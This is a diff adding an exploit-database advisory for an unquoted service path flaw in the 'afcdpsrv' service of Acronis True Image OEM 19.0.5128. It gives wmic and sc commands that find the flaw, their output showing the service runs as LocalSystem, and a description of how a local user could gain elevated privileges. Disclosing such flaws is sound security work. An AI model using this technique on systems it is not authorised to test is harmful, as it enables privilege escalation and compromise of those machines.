@@ -1,0 +1,36 @@
+# Exploit Title: Acronis True Image OEM 19.0.5128 - 'afcdpsrv' Unquoted Service Path
+# Date: 2019-11-11
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://www.acronis.com
+# Software: ftp://supportdownload:supportdownload@ftp.kingston.com/AcronisTrueImageOEM_5128.exe
+# Version: 19.0.5128
+# Tested on: Windows 10
+
+# Description:
+# Acronis True Image OEM 19.0.5128 suffers from an unquoted search path issue impacting the service 'afcdpsrv'. This could potentially allow an 
+# authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. A successful attempt would require 
+# the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could 
+# potentially be executed during application startup or reboot. If successful, the local user’s code would execute with the elevated privileges
+# of the application.
+
+# Prerequisites
+# Local, Non-privileged Local User with restart capabilities
+
+# Details
+C:\>wmic service get name, pathname, displayname, startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+Acronis Nonstop Backup Service		afcdpsrv	C:\Program Files (x86)\Common Files\Acronis\CDP\afcdpsrv.exe	Auto
+
+C:\>sc qc afcdpsrv
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: afcdpsrv
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Common Files\Acronis\CDP\afcdpsrv.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Acronis Nonstop Backup Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
